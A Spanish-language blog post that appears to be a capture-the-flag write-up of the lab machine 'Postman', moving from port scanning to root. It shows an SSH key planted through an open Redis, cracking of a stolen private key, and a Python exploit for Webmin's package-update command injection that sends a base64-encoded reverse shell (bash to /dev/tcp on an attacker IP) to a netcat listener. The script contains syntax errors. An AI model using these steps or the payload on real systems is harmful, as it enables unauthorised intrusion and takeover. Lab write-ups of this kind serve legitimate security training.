---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Postman            |
| Os                     | Linux              |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.160       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Postman/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.160
```

![nmap 1](/assets/images/Postman/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.160 -oG allPorts
```

![nmap2](/assets/images/Postman/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,25,80 10.10.10.160 -oN targeted
```

![nmap3](/assets/images/Postman/nmap3.png)

Vamos ahora a listar informacion del redis, de acuerdo con <a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">hacktrics </a>   

Para intentar entrar por ssh desde redis empezamos por crear nuestras llaves en el directorio ~.ssh/ y con el comando:

```s
ssh-keygen 
```

Ahora para tener en un formato que acepte redis nuestra llave de ssh hacemos un

```s
(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
```

Luego importamos el archivo a redis con un:

```s
cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
```

Ahora vamos a meter las llaves en un directorio comun

```s
redis-cli -h 10.10.10.160
config get dir
config set dir /var/lib/redis/.ssh/

redis-cli -h 10.10.10.160 -x set ssh_key

config set dbfilename "authorized_keys"
```

![redis](/assets/images/Postman/redis.png)

Tenemos ahora acceso como usuario redis, navegando por los directorios podemos encontrar en el directorio /opt una id_rsa de backup que podria ser del usuario Matt. 

Esta llave nos la copiamos a nuestro directorio de contenido y podemos hacer un crackeo de la llave con los comandos siguientes:

```s
#Para meter la llave en un formato para john
ssh2john
john -w:/usr/share/wordlists/rockyou.txt
```

![password cracked](/assets/images/Postman/hash_cracked.png)

Ahora tenemos la contrasena y resulta que es la contrasena de Matt, procedemos a meternos en su perfil con un su Matt; y podremos ver ahora la flag en su directorio.

![Matt](/assets/images/Postman/matt.png)

Lo siguiente para escalar privilegios podria ser empezar por entrar al portal del puerto 10000, como vemos que el servicio ofrecido es webmin y tenemos la version en el dashboard. Podemos buscar exploits en metasploit y construir nuestro propio exploit con python de la forma siguiente:

```py
#!/usr/bin/python3

from pwn import *
import requests, urllib3, pdb, signal, sys

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

login_url = "https://10.10.10.160:10000/session_login.cgi"
update_url = "https://10.10.10.160:10000/package-updates/update.cgi"

def makeRequest():
    #Para pasar el certificad ssl
    urllib3.disable_warnings()
    s = requests.session()
    s.verify = false

    data_post = {
        'user': 'Matt',
        'pass': 'computer2008'
    }

    headers = {
        'Cookie' : 'redirect=1; testing=1; sid=x'
    }
    r = s.post(login_url, data=data_post, headers=headers)

    post_data = [('u': 'acl/apt'),('u', ' | bash -c "echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80NDQ0IDA+JjE=" | base64 -d | bash "'), ('ok_top', 'Update Selected Packages')]

    headers = {
        'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'
    }
    r = s.post (update_url, data=post_data, headers=headers)

if __name__ == '__main__':
    makeRequest()

print (r.text)
```

Ahora lo que insertaremos en el script como nuestro payload para hacer una reverse shell es:

```s
echo -n "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1" | base64
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80NDQ0IDA+JjE=" | base64 -d | bash 

#nos ponemos en escucha desde nuestra maquina para la conexion con
rlwrap nc -nlvp 4444
```

Ahora ya tenemos acceso como root y podremos leer la flag.

![root](/assets/images/Postman/root.png)

![powned](/assets/images/Postman/powned.png)